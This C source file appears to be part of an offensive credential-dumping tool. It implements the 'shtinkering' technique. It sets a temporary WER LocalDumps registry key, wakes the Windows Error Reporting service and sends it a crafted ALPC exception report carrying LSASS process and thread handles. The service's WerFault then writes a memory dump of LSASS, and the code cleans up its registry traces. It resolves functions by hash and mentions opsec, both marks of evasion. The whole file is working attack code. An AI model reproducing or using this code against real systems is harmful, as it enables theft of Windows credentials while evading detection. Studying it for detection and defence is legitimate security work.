#include "shtinkering.h"


BOOL cleanup_registry_key(
    IN HANDLE hRegistry)
{
    BOOL ret_val = FALSE;
    NTSTATUS status = STATUS_UNSUCCESSFUL;

    if (hRegistry)
    {
        status = NtDeleteKey(hRegistry);
        if (!NT_SUCCESS(status))
        {
            syscall_failed("NtDeleteKey", status);
            goto cleanup;
        }
    }

    ret_val = TRUE;

cleanup:
    return ret_val;
}

BOOL set_registry_key(
    OUT PHANDLE phRegistry)
{
    BOOL ret_val = FALSE;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    UNICODE_STRING reg_key_name = { 0 };
    UNICODE_STRING reg_value_name = { 0 };
    OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
    DWORD DumpType = 0;

    if (!phRegistry)
        goto cleanup;

    reg_key_name.Buffer = SHTINKERING_KEY;
    reg_key_name.Length = 0xa0;
    reg_key_name.MaximumLength = 0xa2;

    // Creating the registry key
    InitializeObjectAttributes(&ObjectAttributes, &reg_key_name, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateKey(
        phRegistry,
        KEY_ALL_ACCESS,
        &ObjectAttributes,
        0,
        NULL,
        REG_OPTION_VOLATILE,
        0);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtCreateKey", status);
        goto cleanup;
    }

    DPRINT("Registry key has been created : %ls", reg_key_name.Buffer);

    // set up registry key name
    reg_value_name.Buffer = L"DumpType";
    reg_value_name.Length = 0x10;
    reg_value_name.MaximumLength = 0x12;
    DumpType = LOCAL_DUMP;

    status = NtSetValueKey(
        *phRegistry,
        &reg_value_name,
        0,
        REG_DWORD,
        &DumpType,
        sizeof(DWORD));
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtSetValueKey", status);
        goto cleanup;
    }

    DPRINT("Sub key DumpType has been created");

    ret_val = TRUE;

cleanup:
    return ret_val;
}

BOOL wait_for_wersvc(VOID)
{
    BOOL ret_val = FALSE;
    HANDLE hEvent = NULL;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    OBJECT_ATTRIBUTES objectAttributes = { 0 };
    UNICODE_STRING objectName = { 0 };

    objectName.Buffer = L"\\KernelObjects\\SystemErrorPortReady";
    objectName.Length = 0x46;
    objectName.MaximumLength = 0x48;

    objectAttributes.ObjectName = &objectName;
    objectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
    objectAttributes.RootDirectory = NULL;
    objectAttributes.Attributes = 0;
    objectAttributes.SecurityDescriptor = NULL;
    objectAttributes.SecurityQualityOfService = NULL;

    status = NtOpenEvent(
        &hEvent,
        EVENT_QUERY_STATE|SYNCHRONIZE,
        &objectAttributes);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtOpenEvent", status);
        goto cleanup;
    }

    status = NtWaitForSingleObject(
        hEvent,
        FALSE,
        NULL);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtWaitForSingleObject", status);
        goto cleanup;
    }

    ret_val = TRUE;

cleanup:
    if (hEvent)
        NtClose(hEvent);

    return ret_val;
}

BOOL signal_start_wersvc(VOID)
{
    BOOL ret_val = FALSE;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    PVOID NtUpdateWnfStateData_addr = NULL;
    EtwEventWriteNoRegistration_t EtwEventWriteNoRegistration = NULL;

    // find the address of NtUpdateWnfStateData dynamically
    NtUpdateWnfStateData_addr = get_function_address(
        get_library_address(NTDLL_DLL, TRUE),
        NtUpdateWnfStateData_SW2_HASH,
        0);

    if (NtUpdateWnfStateData_addr)
    {
        ULONG64 werWnfStateName = 0x41940B3AA3BC0875; // WNF_WER_SERVICE_START
        status = NtUpdateWnfStateData(
            &werWnfStateName,
            NULL,
            0,
            NULL,
            NULL,
            0,
            0);
        if (!NT_SUCCESS(status))
        {
            syscall_failed("NtUpdateWnfStateData", status);
            goto cleanup;
        }
    }
    else
    {
        // Alternative to WNF (before Win8 for example)
        EtwEventWriteNoRegistration = (EtwEventWriteNoRegistration_t)(ULONG_PTR)get_function_address(
            get_library_address(NTDLL_DLL, TRUE),
            EtwEventWriteNoRegistration_SW2_HASH,
            0);
        if (!EtwEventWriteNoRegistration)
        {
            api_not_found("EtwEventWriteNoRegistration");
            goto cleanup;
        }

        GUID feedbackServiceTriggerProviderGuid = { 0xe46eead8, 0xc54, 0x4489, {0x98, 0x98, 0x8f, 0xa7, 0x9d, 0x5, 0x9e, 0xe} };
        EVENT_DESCRIPTOR eventDescriptor = { 0 };
        memset(&eventDescriptor, 0, sizeof(EVENT_DESCRIPTOR));
        status = EtwEventWriteNoRegistration(
            &feedbackServiceTriggerProviderGuid,
            &eventDescriptor,
            0,
            NULL);
        if (!NT_SUCCESS(status))
        {
            function_failed("EtwEventWriteNoRegistration");
            goto cleanup;
        }
    }

    ret_val = TRUE;

cleanup:
    return ret_val;
}

BOOL send_message_to_wer_service(
    IN PVOID SendingMessage,
    OUT PVOID ReceivingMessage)
{
    BOOL ret_val = FALSE;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    UNICODE_STRING alpcWerPort_ustr = { 0 };
    HANDLE hPort = NULL;
    OBJECT_ATTRIBUTES objectAttributes = { 0 };
    ALPC_PORT_ATTRIBUTES portAttributes = { 0 };
    SIZE_T bufLength = 0;

    status = signal_start_wersvc();
    if (!NT_SUCCESS(status))
        goto cleanup;

    status = wait_for_wersvc();
    if (!NT_SUCCESS(status))
        goto cleanup;

    alpcWerPort_ustr.Buffer = L"\\WindowsErrorReportingServicePort";
    alpcWerPort_ustr.Length = 0x42;
    alpcWerPort_ustr.MaximumLength = 0x44;

    objectAttributes.Length = sizeof(objectAttributes);
    objectAttributes.RootDirectory = NULL;
    objectAttributes.Attributes = 0;
    objectAttributes.ObjectName = NULL;
    objectAttributes.SecurityDescriptor = NULL;
    objectAttributes.SecurityQualityOfService = NULL;

    memset(&portAttributes, 0, sizeof(portAttributes));
    portAttributes.MaxMessageLength = sizeof(ReportExceptionWerAlpcMessage);

    status = NtAlpcConnectPort(
        &hPort,
        &alpcWerPort_ustr,
        &objectAttributes,
        &portAttributes,
        ALPC_MSGFLG_SYNC_REQUEST,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtAlpcConnectPort", status);
        goto cleanup;
    }

    bufLength = sizeof(ReportExceptionWerAlpcMessage);
    status = NtAlpcSendWaitReceivePort(
        hPort,
        ALPC_MSGFLG_SYNC_REQUEST,
        (PPORT_MESSAGE)SendingMessage,
        NULL,
        (PPORT_MESSAGE)ReceivingMessage,
        &bufLength,
        NULL,
        NULL);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtAlpcSendWaitReceivePort", status);
        goto cleanup;
    }

    // Check that the status from the call and in the received message indicate success
    if (NT_SUCCESS(status) && STATUS_TIMEOUT != status)
    {
        if (!NT_SUCCESS(((PReportExceptionWerAlpcMessage)ReceivingMessage)->NtStatusErrorCode))
        {
            PRINT_ERR("the Wer service responded with an error");
            goto cleanup;
        }
    }
    else
    {
        syscall_failed("NtAlpcSendWaitReceivePort", status);
        goto cleanup;
    }

    ret_val = TRUE;

cleanup:
    if (hPort)
        NtClose(hPort);

    return ret_val;
}

BOOL find_valid_thread_id(
    IN DWORD process_id,
    OUT PDWORD pthread_id)
{
    BOOL ret_val = FALSE;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    *pthread_id = 0;

    /*
     * while interacting with other processes is bad for opsec,
     * the permissions are harmless and most likely whitelisted
     */
    hProcess = get_process_handle(
        process_id,
        PROCESS_QUERY_INFORMATION,
        FALSE,
        0);
    if (!hProcess)
    {
        PRINT_ERR("Failed to open handle to spoofed process id %ld", process_id);
        goto cleanup;
    }

    status = NtGetNextThread(
        hProcess,
        hThread,
        THREAD_QUERY_LIMITED_INFORMATION,
        0,
        0,
        &hThread);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtGetNextThread", status);
        goto cleanup;
    }

    *pthread_id = get_tid(hThread);
    if (!*pthread_id)
        goto cleanup;

    ret_val = TRUE;

cleanup:
    if (hProcess)
        NtClose(hProcess);
    if (hThread)
        NtClose(hThread);

    return ret_val;
}

BOOL werfault_shtinkering(
    IN DWORD lsass_pid,
    IN HANDLE hProcess)
{
    BOOL ret_val = FALSE;
    BOOL success = FALSE;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    DWORD lsass_tid = 0;
    HANDLE hThread = NULL;
    HANDLE hWerfault = NULL;
    HANDLE hRecoveryEvent = NULL;
    HANDLE hCompletionEvent = NULL;
    HANDLE hFileMapping = NULL;
    PVOID mappedView = NULL;
    LARGE_INTEGER max_size = { 0 };
    SIZE_T view_size = 0;
    OBJECT_ATTRIBUTES attr_inheritable = { 0 };
    CLIENT_ID cid = { 0 };
    HANDLE hRegistry = NULL;
    PReportExceptionWerAlpcMessage receivingMessage = NULL;

    // Create exception details
    EXCEPTION_RECORD exceptionRecord = { 0 };
    EXCEPTION_POINTERS exceptionPointers = { 0 };
    CONTEXT context = { 0 };
    exceptionRecord.ExceptionCode = STATUS_UNSUCCESSFUL;
    exceptionPointers.ExceptionRecord = &exceptionRecord;
    exceptionPointers.ContextRecord = &context;

    success = set_registry_key(&hRegistry);
    if (!success)
        goto cleanup;

    InitializeObjectAttributes(&attr_inheritable, NULL, OBJ_INHERIT, 0, NULL);

    // Create hRecoveryEVent & hCompletionEvent
    status = NtCreateEvent(
        &hRecoveryEvent,
        GENERIC_ALL,
        &attr_inheritable,
        FALSE,
        FALSE);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtCreateEvent", status);
        goto cleanup;
    }

    status = NtCreateEvent(
        &hCompletionEvent,
        GENERIC_ALL,
        &attr_inheritable,
        FALSE,
        FALSE);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtCreateEvent", status);
        goto cleanup;
    }

    // Create the file mapping
    max_size.QuadPart = sizeof(MappedViewStruct);
    status = NtCreateSection(
        &hFileMapping,
        SECTION_ALL_ACCESS,
        &attr_inheritable,
        &max_size,
        PAGE_READWRITE,
        SEC_COMMIT,
        NULL);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtCreateSection", status);
        goto cleanup;
    }

    status = NtMapViewOfSection(
        hFileMapping,
        NtCurrentProcess(),
        &mappedView,
        0,
        0,
        NULL,
        &view_size,
        ViewShare,
        0,
        PAGE_READWRITE);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtMapViewOfSection", status);
        goto cleanup;
    }

    success = find_valid_thread_id(lsass_pid, &lsass_tid);
    if (!success)
        goto cleanup;

    DPRINT("thread id: %ld", lsass_tid);

    cid.UniqueProcess = (HANDLE)(ULONG_PTR)lsass_pid;
    cid.UniqueThread = (HANDLE)(ULONG_PTR)lsass_tid;
    status = NtOpenThread(
        &hThread,
        THREAD_QUERY_LIMITED_INFORMATION,
        &attr_inheritable,
        &cid);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtOpenThread", status);
        goto cleanup;
    }

    // Prepare the MappedViewStruct
    MappedViewStruct mps = { 0 };
    mps.Size = sizeof(MappedViewStruct);
    mps.ExceptionPointers = &exceptionPointers;
    mps.hCompletionEvent = hCompletionEvent;
    mps.hRecoveryEvent = hRecoveryEvent;
    mps.NtErrorCode = (DWORD)E_FAIL;
    mps.NtStatusErrorCode = STATUS_UNSUCCESSFUL;
    mps.TickCount = get_tick_count();
    mps.TargetProcessPid = lsass_pid;
    mps.hTargetProcess = hProcess;
    mps.TargetThreadTid = lsass_tid;
    mps.hTargetThread = hThread;

    // Prepare the ALPC request
    ReportExceptionWerAlpcMessage sendingMessage = { 0 };
    sendingMessage.PortMessage.u1.s1.TotalLength = sizeof(ReportExceptionWerAlpcMessage);
    sendingMessage.PortMessage.u1.s1.DataLength = sizeof(ReportExceptionWerAlpcMessage) - sizeof(PORT_MESSAGE);
    sendingMessage.MessageType = RequestReportUnhandledException;
    sendingMessage.Flags = 0;
    sendingMessage.hFileMapping = hFileMapping;
    sendingMessage.hCompletionEvent = hCompletionEvent;
    sendingMessage.hRecoveryEvent = hRecoveryEvent;
    sendingMessage.hFileMapping2 = hFileMapping;
    sendingMessage.hTargetProcess = mps.hTargetProcess;
    sendingMessage.hTargetThread = mps.hTargetThread;
    sendingMessage.TargetProcessId = mps.TargetProcessPid;

    // Prepare the ALPC response
    receivingMessage = intAlloc(sizeof(ReportExceptionWerAlpcMessage));
    if (!receivingMessage)
    {
        malloc_failed();
        goto cleanup;
    }
    receivingMessage->PortMessage.u1.s1.TotalLength = sizeof(ReportExceptionWerAlpcMessage);
    receivingMessage->PortMessage.u1.s1.DataLength = sizeof(ReportExceptionWerAlpcMessage) - sizeof(PORT_MESSAGE);

    // Copy the struct into the mapped view
    memcpy(mappedView, &mps, sizeof(mps));

    // Send the request and get the response from the ALPC server
    success = send_message_to_wer_service(
        &sendingMessage,
        receivingMessage);

    // Did we fail to send the ALPC message?
    if (!success)
    {
        goto cleanup;
    }

    // Did the operation not succeed on WerSvc side?
    if (!NT_SUCCESS(receivingMessage->NtStatusErrorCode))
    {
        DPRINT_ERR("receivingMessage->NtStatusErrorCode is 0x%lx", receivingMessage->NtStatusErrorCode);
        goto cleanup;
    }

    // Check if message type indicates failure
    if (ReplyReportUnhandledExceptionFailure != receivingMessage->MessageType)
    {
        DPRINT_ERR("receivingMessage->MessageType is 0x%lx", receivingMessage->NtStatusErrorCode);
        goto cleanup;
    }

    hWerfault = (HANDLE)(ULONG_PTR)receivingMessage->Flags;
    if (!hWerfault)
    {
        goto cleanup;
    }

    // Wait for WeFault to exit
    while (TRUE)
    {
        status = NtWaitForSingleObject(hWerfault, TRUE, NULL);

        // Was there was either a timeout or a failure
        if (STATUS_TIMEOUT == status || !NT_SUCCESS(status))
            break;

        // If there wasn't a failure,
        // did we return because of an APC or because the wait was aborted?
        if (STATUS_USER_APC != status && STATUS_ALERTED != status)
        {
            status = STATUS_SUCCESS;
            break;
        }

    }

    success = print_shtinkering_crash_location();
    if (!success)
    {
        DPRINT_ERR("Failed to print the crash directory");
    }

    ret_val = TRUE;

cleanup:
    if (hThread)
        NtClose(hThread);
    if (mappedView)
    {
        status = NtUnmapViewOfSection(
            NtCurrentProcess(),
            mappedView);
        if (!NT_SUCCESS(status))
        {
            syscall_failed("NtUnmapViewOfSection", status);
        }
    }
    if (hFileMapping)
        NtClose(hFileMapping);
    if (hCompletionEvent)
        NtClose(hCompletionEvent);
    if (hRecoveryEvent)
        NtClose(hRecoveryEvent);
    if (hRegistry)
    {
        cleanup_registry_key(hRegistry);
        NtClose(hRegistry);
        DPRINT("cleaned the registry key");
    }
    if (receivingMessage)
        intFree(receivingMessage);

    return ret_val;
}
